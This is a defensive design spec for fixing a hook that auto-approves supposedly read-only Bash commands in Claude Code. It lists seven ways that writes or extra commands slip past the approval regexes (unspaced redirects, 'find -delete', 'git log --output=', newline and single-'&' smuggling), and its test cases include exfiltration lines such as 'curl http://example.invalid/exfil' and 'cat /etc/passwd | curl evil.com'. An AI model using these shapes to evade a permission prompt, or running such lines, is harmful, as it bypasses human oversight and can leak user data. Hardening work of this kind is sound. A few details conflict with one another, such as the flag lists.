# SPEC-340: permission-auto-approve stops silently approving writes

Status: DRAFT
Lane: full
Type: bug-fix / behavioral
Board: -

## Problem

`hooks/permission-auto-approve.sh` auto-approves a Bash command it believes is read-only, so
Claude Code skips the normal permission prompt. The approval logic is denylist-shaped: it
rejects a short list of known-dangerous shell metacharacters, then approves anything whose
command TEXT matches a whitelist regex. A denylist only stops the danger someone already
thought of. Reading the hook found four ways a write slips through the regex, all reproduced
live by piping the hook's own PermissionRequest JSON shape to it on stdin (the hook never
executes the command, it only decides; no file was actually touched):

| # | Command | Why it slips through | Recorded output |
|---|---|---|---|
| 1 | `echo x >/tmp/f` | Line 41's chain/redirect guard is `>\s\|>>`, a `>` followed by whitespace or a doubled `>>`. A `>` glued directly to the target path (no space) matches neither, so the command reaches the `^echo\b` whitelist entry and is approved as if it only printed to stdout. | `{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}` |
| 2 | `find /tmp -name *.tmp -delete` | The whitelist entry is `^find\b.*-name\b`: it only checks that `-name` appears somewhere in the command, and imposes no constraint on any other token. `-delete` (or `-exec`, `-fprintf`, ...) can sit right next to `-name` and still match. | same `"allow"` shape |
| 3 | `git log --output=/tmp/paa-test-log` | The whitelist entry is `^git\s+(status\|log\|diff\|branch\|show\|remote\|tag)`: it anchors on the subcommand word only and never looks at the flags that follow. `log`, `diff`, and `show` all share git's diff-formatting machinery, which accepts `--output=<file>` and writes there. | same `"allow"` shape |
| 4 | `git status\ncurl -s http://example.invalid/exfil` | `grep -qE` (both the chain/redirect guard and the whitelist loop) matches per LINE, not per whole string, because `CMD` is fed to `grep` unquoted through a pipe that never disables its default line-oriented behavior. A newline is not in the guard's character class, so it is not rejected at line 41, and the first line alone (`git status`) satisfies the whitelist test even though a second, completely unrelated command rides along in the same `tool_input.command` string. | same `"allow"` shape |

The same read-and-probe pass found three more instances of the identical root cause (a
regex that checks presence, not exclusivity), listed here because the fix in ## Contract closes
all of them, not just the four the task named:

| Command | Why it slips through | Recorded output |
|---|---|---|
| `ls & curl http://example.invalid/exfil` | The chain guard's `\&\&` requires a DOUBLE ampersand; a single `&` (background execution) is not in the character class at all. | `"allow"` |
| `cat </etc/hosts` | The chain guard checks `>` (output redirect) but has no entry for `<` (input redirect / process substitution). Not a write by itself, but it is a redirection operator the guard's own header claims to block, and `<()` process substitution can smuggle a subshell through it. | `"allow"` |
| `git branch newbranch` / `git tag v9.9.9` / `git remote add evil <url>` | Same subcommand-only anchor as case 3. `git branch <name>` creates a branch, `git tag <name>` creates a tag, `git remote add` writes a new remote into `.git/config`; none of these are read operations, and none are excluded by a regex that only checks the subcommand word. | `"allow"` |

Baseline (unchanged by the fix, confirmed live): `git status`, `git log --oneline -5`, and
`ls -la` all return the same `"allow"` shape today. These three anchor the must-still-approve
group in ## Test plan.

`tests/test-hooks.sh` (lines 557-591 and 2091-2177) tests the hook's SECURITY GATE (pipe/chain
rejection) and its cosmetic never-blocks contract, but has no case for any of the seven shapes
above: none of them are chained, piped, or malformed JSON, so the existing suite is silent on
them by construction, not by having tried and passed.

## Design

**Goal:** the hook approves a command only when it can positively confirm the command is a
single, simple, read-only invocation. Anything it cannot positively confirm returns no decision,
so Claude Code shows the normal permission prompt. The hook never denies; ## Contract keeps that
invariant (`tests/test-hooks.sh`'s existing cosmetic-module block already pins "no cosmetic hook
contains a block/deny emitter" by grepping the source, and this fix adds no deny branch).

**Allowlist over denylist, stated once, applies everywhere below.** A denylist has to name every
dangerous shape in advance; anything the author did not think of is approved by default until
someone notices. That is exactly the shape of all seven bugs above: `>` without a following
space, a single `&`, `<`, a subcommand-only git check, a presence-only `find` check. Every one of
them is a case the denylist's author did not enumerate. An allowlist inverts the default: a
command, flag, or shape that was never positively confirmed safe is excluded, not included, so a
write vector nobody has thought of yet still falls through to the normal prompt instead of being
silently approved. The cost is real (fewer commands auto-approve, more prompts show) and it is
the correct trade for a hook whose entire job is deciding what to approve WITHOUT asking a human.

### Rejected alternatives

| Approach | Why not |
|---|---|
| Patch the four known regexes in place (require whitespace before `>`, add `-delete` to a "bad flags" denylist for `find`, add `--output` to a denylist for `git log/diff/show`, treat `\n` as a chain operator) | Fixes exactly the four reported shapes and nothing else. The three additional shapes found by reading the same code with the same lens (`&`, `<`, `git branch/tag/remote` mutation) prove the class is bigger than the four named cases; patching case-by-case just continues the denylist's whack-a-mole pattern that created the bug in the first place. |
| Full shell grammar parser (proper tokenizer with quote-awareness, here-doc detection, brace expansion, glob resolution) | Correct in the limit but far past what "single, simple, read-only invocation" needs, and a bigger parser is a bigger place for the next false-approve to hide. `safety-gate.sh` (SPEC-064) already carries a heavier parser for a different, harder job (finding dangerous ops buried inside compound commands); this hook's job is narrower, it should refuse anything compound outright rather than understand it. |
| Keep the regex-whitelist shape but require every regex to end in `$` (anchor both ends) | Closes the git-subcommand-only and find-presence-only gaps for the SPECIFIC patterns rewritten, but a `$`-anchored regex still cannot express "no `-delete` token anywhere among these args" without turning into the same per-flag enumeration this spec ends up doing anyway. Anchoring is necessary but not sufficient, so the fix goes straight to explicit flag lists rather than a halfway regex patch that still needs a second pass. |
| **Chosen: single-line + metacharacter gate, then a first-word allowlist, then an explicit safe-flag allowlist for every tool that has a write-capable option** | Directly implements "positively confirm read-only." Each stage is independently simple to read and to test; a tool absent from the first-word list, or a flag absent from its safe-flag list, is excluded by construction rather than by someone remembering to add it to a denylist. |

## Picture

```
 stdin JSON {tool_name, tool_input.command}
        |
        v
 TOOL in {Read,Glob,Grep,WebSearch,WebFetch}? --yes--> allow        (unchanged)
        |no
        v
 TOOL == Bash and CMD non-empty?  --no--> no decision (fall through)
        |yes
        v
 STAGE A: CMD contains a newline?             --yes--> no decision   [case 4]
        |no
        v
 STAGE B: CMD contains any of  ; & | < > ` $( ( )  ?    --yes--> no decision
        |no                                            [new: single &, bare <]
        v
 STAGE C: split CMD on whitespace into WORDS[]
        |
        v
 STAGE D: WORDS[0] on the "no write-capable option" list
          (ls, cat, head, tail, wc, echo, which, type, file,
           stat, du, df, grep, printenv, git-status, git-ls-files)?
        |yes --------------------------------------------> allow
        |no
        v
 STAGE D: WORDS[0] is "pwd" or "env" and WORDS has length 1?
        |yes --------------------------------------------> allow
        |no
        v
 STAGE E: WORDS[0] is a GATED tool (find, git, npm, npx, go,
          node, python3, ruff, cargo)?
        |no ---------------------------------------------> no decision
        |yes
        v
 STAGE F: every remaining WORDS[i] that starts with "-" (or,
          for git, WORDS[1] the subcommand) is a member of that
          tool's explicit safe-subcommand/safe-flag set?     [case 2, 3,
        |no --------------------------------------------->    new git cases]
        |    no decision
        |yes
        v
      allow
```

## Contract

Every check below runs in the order shown; the first failing check falls through to no decision
(the normal prompt). Nothing in this hook ever emits a deny/block decision (unchanged invariant).

**Stage A, single line.** `CMD` must not contain a newline (`$'\n'`). Closes case 4.

**Stage B, no chain/redirect/substitution metacharacters, checked over the WHOLE string.**
Reject if `CMD` contains any of: `;` `&` `|` `<` `>` `` ` `` the two-character sequence `$(`
`(` `)`. A bare `$VAR` (variable expansion, no parenthesis) is allowed; only `$(` (command
substitution) is rejected. Closes case 1 (any `>`, spaced or not), the single-`&` background gap,
and the bare-`<` gap. `(`/`)` are rejected outright (no bare-subshell exception) since none of
the tools this hook approves need literal parentheses in ordinary read-only use.

**Stage C, tokenize.** Split `CMD` on IFS whitespace into `WORDS[]`. Quotes are not stripped or
interpreted (see Failure modes); this is a heuristic token scan, not a shell parser, and it must
never be asked to be one.

**Stage D, commands with no write-capable option (first word decides, no further check):**

| Command | Notes |
|---|---|
| `ls`, `cat`, `head`, `tail`, `wc`, `echo`, `which`, `type`, `file`, `stat`, `du`, `df`, `grep`, `printenv` | No flag on any of these writes to the filesystem or runs another program; Stage B already removed every redirect/chain vector, so any trailing flags are unrestricted. |
| `pwd`, `env` | Exact match, zero further tokens. `env` with any argument can run an arbitrary program (`env FOO=x rm -rf /`); keeping it a bare, zero-arg command (as the current hook already does) is the one exception carried forward unchanged. |
| `git status`, `git ls-files` | Exact two-word match at `WORDS[0..1]`; no write-capable flag exists on either subcommand, so trailing flags are unrestricted. |
| `node --version`, `python3 --version`, `cargo --version` | Exact match, `WORDS[0..1]` only, nothing after. |

**Stage E/F, gated tools (explicit safe subcommand/flag allowlist required):**

| Tool | Rule |
|---|---|
| `find` | `WORDS[0] == "find"`. Every token in `WORDS[1:]` that starts with `-` must be one of: `-name`, `-iname`, `-path`, `-ipath`, `-type`, `-maxdepth`, `-mindepth`, `-print`, `-print0`. Any other `-`-prefixed token (`-delete`, `-exec`, `-execdir`, `-ok`, `-okdir`, `-fprint`, `-fprintf`, `-fls`, or anything not in this list) falls through. Non-flag tokens (search paths, `-name` patterns) are unrestricted. Closes case 2. |
| `git log`, `git diff`, `git show` | `WORDS[1]` in `{log, diff, show}`. Every remaining token that starts with `-` must be one of: `--oneline`, `--graph`, `--all`, `--stat`, `--name-only`, `--name-status`, `-p`, `--patch`, `--no-merges`, `--merges`, `--reverse`, `--cached`, `--staged`, or match the numeric-count shape `^-[0-9]+$` (e.g. `-5`), or start with one of the safe prefixes `--format=`, `--pretty=`, `--since=`, `--until=`, `--author=`, `--grep=`, `--max-count=`. `--output`, `--output=...`, and any other unlisted flag are excluded by omission, not by name. Closes case 3. |
| `git branch` | `WORDS[1] == "branch"`. Zero non-flag tokens allowed (no branch-name argument, which is what creates a branch). Any `-`-prefixed token must be one of `-v`, `-vv`, `-a`, `-r`, `--list`, `--show-current`. Closes the new `git branch newbranch` case. |
| `git remote` | `WORDS[1] == "remote"`. Zero or one further token; if present it must be exactly `-v`, `--verbose`, or `show`. `add`/`remove`/`rename`/`set-url`/`set-branches`/`set-head`/`prune` are excluded by omission. Closes the new `git remote add` case. |
| `git tag` | `WORDS[1] == "tag"`. Zero non-flag tokens allowed (no tag-name argument, which is what creates a tag). Any `-`-prefixed token must be one of `-l`, `--list`, or match `^-n[0-9]*$`. `-d`, `-a`, `-f`, `-s`, `-m` are excluded by omission. Closes the new `git tag v9.9.9` case. |
| `npm` | `WORDS[1]` in `{list, ls, outdated, view}`. Trailing flags unrestricted (none of these four subcommands has a write-capable variant). |
| `npx` | `WORDS[1] == "prettier"` and `--check` appears among `WORDS[2:]`; nothing else runs through `npx`. |
| `go` | `WORDS[1]` in `{version, env, list}`. Trailing flags unrestricted. |
| `ruff` | `WORDS[1] == "check"`. No `--fix` or `--unsafe-fixes` token anywhere in `WORDS[2:]` (both rewrite files in place). |

`sed` and `sort` are named in the task brief as tools whose base command has write-capable
options (`sed -i`, `sort -o`). Neither appears anywhere in the current hook, so there is no
existing bypass to fix; ## Rejected alternatives below states the decision to leave them off the
allowlist entirely rather than add them as new capability. `tests/test-hooks.sh` gets one
must-not-approve case each (`sed -i s/a/b/ file`, `sort -o out.txt file`) proving they fall
through purely because Stage D/E never names them, not because of any sed/sort-specific logic.

**Sed/sort, explicitly rejected as new scope:**

| Option | Why not |
|---|---|
| Add `sed`/`sort` to Stage D or E with flag-level filtering (`-i`/`-o` excluded, everything else allowed) | This is new auto-approval capability the current hook never had; the task is closing an existing over-approval, not growing the approved surface. Two more gated-tool flag tables cost real review surface for a benefit nobody asked for (YAGNI). If a future operator wants `sed`/`sort` auto-approved, that is a separate, explicitly-scoped follow-up, not a rider on a hardening fix. |
| **Chosen: leave `sed`/`sort` absent from every stage** | They already fall through to the normal prompt today (never matched any existing regex); this fix changes nothing about them, and a test pins that a write-capable form of each still falls through after the rewrite, so a future edit that accidentally adds a loose `^sed\b` or `^sort\b` entry is caught. |

## Failure modes

| Class | Consequence | Why acceptable |
|---|---|---|
| A safe command uses a flag not yet on its tool's safe list (e.g. `git log --author=alice`) | Falls through to the normal prompt instead of auto-approving | The stated failure mode: never a false approve, only an extra prompt. The safe-flag lists can be extended later, named as a follow-up, without touching Stage A/B/C. |
| Stage C's whitespace tokenizer is not quote-aware, so `find . -name "-delete"` (a literal filename) produces the token `"-delete"` (with quotes attached), not `-delete` | Does not match `-delete` in the reject-by-omission set (the quoted token is a different string), so it is not specially blocked, but it is also not specially approved either; it is just an ordinary non-flag-looking token that happens to start with a quote character rather than `-`. No security consequence: worst case is an occasional command that could safely auto-approve instead prompts. |
| A quoted argument containing a space (`git log --format="%h %s"`) splits into two tokens on the space inside the quotes | The second half-token (`%s"`) does not start with `-`, so it is treated as an unrestricted value token, same as any other non-flag argument; the first half (`--format="%h`) matches the `--format=` safe prefix. No false approve results from this, only from the pre-existing whitespace-split limitation the hook already had for every prior regex-based check. |
| A genuinely malicious command is crafted entirely from tokens that individually look like safe flags but combine into an unsafe git invocation not covered above (e.g. a future git subcommand this spec never enumerated) | Falls through, because Stage E only recognizes the eight gated tools and their named subcommands; any subcommand outside `{status, log, diff, show, branch, remote, tag, ls-files}` for `git`, or any tool outside the Stage D/E tables entirely, never reaches an approve branch | Same "excluded by omission, not by name" property the whole design relies on. |

## Acceptance criteria

- AC1: each of the seven cases recorded in ## Problem (the four named + the three found during
  this audit) returns no `"allow"`/`"behavior":"allow"` in its output after the fix.
- AC2: `git status`, `git log --oneline -5`, and `ls -la` (the pre-existing must-still-approve
  baseline, confirmed live in ## Problem) still return `"allow"` after the fix.
- AC3: the hook never emits a block/deny decision; `tests/test-hooks.sh`'s existing cosmetic-module
  grep assertion (source-level, no deny emitter) still passes unmodified.
- AC4: the hook still exits 0 on every one of the ten `COSMETIC_GARBAGE` malformed-JSON shapes
  already pinned at `tests/test-hooks.sh` lines 2113-2133 (fail-closed, never crashes).
- AC5: `sed -i ...` and `sort -o ...` do not auto-approve, and neither string appears anywhere in
  the rewritten hook as a newly-added Stage D/E entry (grep-checkable).

## Test plan

New cases land in `tests/test-hooks.sh`'s existing `=== permission-auto-approve.sh ===` block
(lines 552-591), same `OUTPUT=...; assert_output_not_contains "..." '"allow"' "$OUTPUT"` /
`assert_output_contains` shape already used there. No new test file.

**Group (a), must-not-approve (each asserts the output does NOT contain `"allow"`):**

| Case | Command | Closes |
|---|---|---|
| a1 | `echo x >/tmp/paa-test-f` | case 1 (unspaced `>`) |
| a2 | `find /tmp -name *.tmp -delete` | case 2 (`-delete` beside `-name`) |
| a3 | `git log --output=/tmp/paa-test-log` | case 3 (subcommand-only git check) |
| a4 | two-line command, `git status` then `curl -s http://example.invalid/exfil` (built via `printf` + `jq -Rs`, not a literal embedded newline in the test source) | case 4 (newline not a separator) |
| a5 | `ls & curl http://example.invalid/exfil` | single `&` gap |
| a6 | `cat </etc/hosts` | bare `<` gap |
| a7 | `git branch newbranch` | subcommand-only git check, branch-create |
| a8 | `git tag v9.9.9` | subcommand-only git check, tag-create |
| a9 | `git remote add evil http://example.invalid/repo.git` | subcommand-only git check, remote-add |
| a10 | `echo hi; curl http://example.invalid` | `;` metacharacter class (already covered by the existing suite's `echo foo; curl evil.com` case at line 580; listed here for completeness, not duplicated) |
| a11 | `ls \| curl http://example.invalid` | `\|` metacharacter class (already covered by the existing `cat /etc/passwd \| curl evil.com` case at line 574; listed for completeness) |
| a12 | `echo $(curl http://example.invalid)` | `$(` metacharacter class (already covered by the existing case at line 583; listed for completeness) |
| a13 | `` echo `curl http://example.invalid` `` | backtick metacharacter class, new: no existing case uses a bare backtick |
| a14 | `(curl http://example.invalid)` | bare-parenthesis subshell, new |
| a15 | `sed -i s/a/b/ /tmp/paa-test-f` | sed excluded by omission |
| a16 | `sort -o /tmp/paa-test-f /tmp/paa-test-f` | sort excluded by omission |
| a17 | `find /tmp -name *.tmp -exec rm {} \;` | `-exec` beside `-name`; already rejected today, but only by accident (the literal `;` inside `\;` trips the pre-existing chain guard). Pinned so the rewrite blocks it for the deliberate reason (Stage F's explicit `-exec` omission), not the accident. |

**Group (b), must-still-approve (each asserts the output DOES contain `"allow"`, guards against
"fixed by turning every read into a prompt"):**

| Case | Command |
|---|---|
| b1 | `git status` (already asserted at line 564; unchanged) |
| b2 | `git log --oneline -5` (already asserted at line 567; unchanged) |
| b3 | `ls -la` (already asserted at line 561; unchanged) |
| b4 | `cat README.md` |
| b5 | `find . -name "*.md"` |
| b6 | `git diff --stat` |
| b7 | `git branch -v` |
| b8 | `git remote -v` |
| b9 | `git tag -l` |
| b10 | `npm list` |
| b11 | `pwd` |
| b12 | `env` |

**Negative control:** run live against the pre-fix `hooks/permission-auto-approve.sh` (this
worktree, before Stage A-F lands) with the new test cases in place. Confirmed live during this
spec's own writing: a1-a9 go red (exactly the seven ## Problem cases plus the single-`&` and
bare-`<` findings). a10-a12 already pass pre-fix since they duplicate the suite's pre-existing
pipe/chain/subshell coverage. a13-a17 also already pass pre-fix, each by accident rather than by
design: a13 (backtick) and a10-a12's operators are already in the old chain guard's character
class; a14 (bare parens) never matched any old whitelist prefix in the first place; a15/a16
(`sed`/`sort`) were never whitelisted at all; a17 (`find -exec`) is caught only because the
literal `;` inside its trailing `\;` trips the old chain guard, not because of anything specific
to `-exec`. Every group (a) case is kept as a pin regardless of whether it already passed
pre-fix, so the rewrite closes each one for the deliberate, documented reason (Stage B's explicit
metacharacter list, Stage D/E's explicit tool/flag omission), not by continuing to rely on an
accident of the old regex. Group (b) stays green pre- and post-fix throughout.

## Verification

`bash tests/test-hooks.sh` exits 0, permission-auto-approve section shows the new
group-(a)/group-(b) cases passing (`PASS` count increases by the number of new assertions listed
above, `FAIL` count 0). The negative control above run once, live, during implementation (not
part of the committed suite), confirming group (a) is red against the unpatched hook and green
against the fix.

## Touches

- `hooks/permission-auto-approve.sh`: the Stage A-F rewrite (implementation, next lane phase).
- `tests/test-hooks.sh`: the group (a)/(b) cases above, added to the existing
  `=== permission-auto-approve.sh ===` block.
- `docs/FEATURES.md`: regenerate via `bash lib/registry/feature-registry.sh generate` once this
  spec file exists, so the `permission-auto-approve.sh` row's Specs column picks up SPEC-340
  (the generator greps `docs/specs/SPEC-*.md` for the token `permission-auto-approve`; this spec
  mentions it throughout, so no extra marker is needed).
- `hooks/codex-hooks.json` / `lib/codex/repin.sh`: checked, not touched. Neither file references
  `permission-auto-approve.sh`; the sha256 pins in `codex-hooks.json` cover exactly five files
  (`codex-hook-adapter.sh`, `safety-gate.sh`, `ship-gate.sh`, `commit-format.sh`,
  `secrets-guard.sh`), confirmed by grep. `permission-auto-approve.sh` is not part of the Codex
  hard-guardrail spine, so this spec has nothing to repin.
- `hooks.json` / `settings.json` / `anchor-root.sh`: explicitly out of scope for this worktree
  (owned by another branch); not touched, not read for anything beyond the sha-pin check above.

## After state

`hooks/permission-auto-approve.sh` still auto-approves the same everyday read-only commands it
does today (Group (b)), and no longer auto-approves any of the seven write/exfiltration shapes
found in ## Problem, nor the further shapes closed incidentally by the same allowlist rewrite
(single `&`, bare `<`, bare parens, backtick, `git branch`/`tag`/`remote` mutation, `find -exec`).
The hook still never emits a deny decision; a command it cannot positively confirm as read-only
falls through to the normal Claude Code permission prompt instead. `sed` and `sort` remain
absent from the approved set, unchanged from today's behavior, now with a regression test proving
it stays that way.

Not covered:

- Extending the git `log`/`diff`/`show` safe-flag list to cover more read-only flags
  (`--author=`, `--since=` already included; something like `--follow` is not). An operator who
  hits a prompt for a flag they believe is safe can propose adding it to the Stage E table in a
  follow-up; the failure mode is an extra prompt, never a silent approval, so there is no urgency
  to enumerate every git flag up front.
- A quote-aware tokenizer for Stage C. Documented as a known limitation in ## Failure modes: the
  worst case is an occasional over-cautious prompt, never a false approve.
- Adding `sed`/`sort` (or any other tool) to the approved set. Explicitly rejected in ## Design;
  a separate, explicitly-scoped follow-up if ever wanted.

## Decision Log

- Chose a staged pipeline (single-line, then metacharacter-reject, then tokenize, then first-word
  allowlist, then per-tool safe-flag allowlist) over patching the four reported regexes in place,
  after finding three more instances of the identical root cause with the same read-through; a
  denylist patch only ever closes the cases someone happened to name.
- Chose to reject bare `(`/`)` outright rather than special-case `find`'s escaped-parenthesis
  grouping syntax, since none of the safe `find` flags this spec allows need it; simpler than
  teaching Stage B about escaped versus bare parens for one flag class nobody asked to keep.
  See `Not covered` and `## Failure modes`.
- Chose to leave `sed`/`sort` off the allowlist entirely (proven by a must-not-approve test)
  rather than add flag-gated entries for them, since neither has ever been part of the hook's
  approved surface; adding new approved tools is out of scope for a hardening fix.
- Chose exact, zero-argument matches for `pwd`, `env`, and the `--version` trio (`node`,
  `python3`, `cargo`) over allowing trailing flags, carrying forward the current hook's existing
  `^pwd$` / `^env$` exactness rather than loosening it while rewriting everything around it.
- Chose to keep the safe-flag lists for `git log`/`diff`/`show` deliberately short (covering the
  pre-existing must-still-approve baseline plus a handful of obviously-safe additions) rather than
  exhaustive, and named the gap explicitly in `Not covered`: the cost of an unlisted-but-safe flag
  is one extra prompt, not a security hole, so there is no pressure to front-load every git flag.
